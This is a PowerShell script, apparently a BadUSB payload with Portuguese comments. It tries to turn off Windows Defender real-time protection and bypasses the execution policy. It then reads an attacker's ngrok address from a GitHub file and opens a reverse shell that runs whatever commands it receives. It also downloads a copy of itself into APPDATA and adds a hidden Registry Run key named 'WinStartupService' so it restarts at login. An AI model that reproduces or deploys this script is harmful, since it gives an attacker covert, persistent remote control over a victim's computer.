# Bypass AV e Execution Policy
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Set-ExecutionPolicy Bypass -Scope Process -Force

# Caminho do script persistente
$persistPath = "$env:APPDATA\\Microsoft\\Windows\\payload.ps1"

# Baixa IP/porta atualizado do GitHub (ngrok.txt)
function Start-ReverseShell {
    try {
        $NgrokUrl = "https://raw.githubusercontent.com/GBLins14/badusb/main/ngrok.txt"
        $NgrokPublicUrl = Invoke-RestMethod -Uri $NgrokUrl
        $ip = $NgrokPublicUrl.Split(":")[0]
        $port = [int]$NgrokPublicUrl.Split(":")[1]

        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }

        $client.Close()
    } catch {
        Start-Sleep -Seconds 10
        Start-ReverseShell
    }
}

# Salvar cópia persistente do script (caso ainda não exista)
if (!(Test-Path $persistPath)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GBLins14/badusb/main/payload.ps1" -OutFile $persistPath
}

# Criar chave de inicialização no Registro
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WinStartupService"

if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistPath`""
}

# Executar o shell
Start-ReverseShell

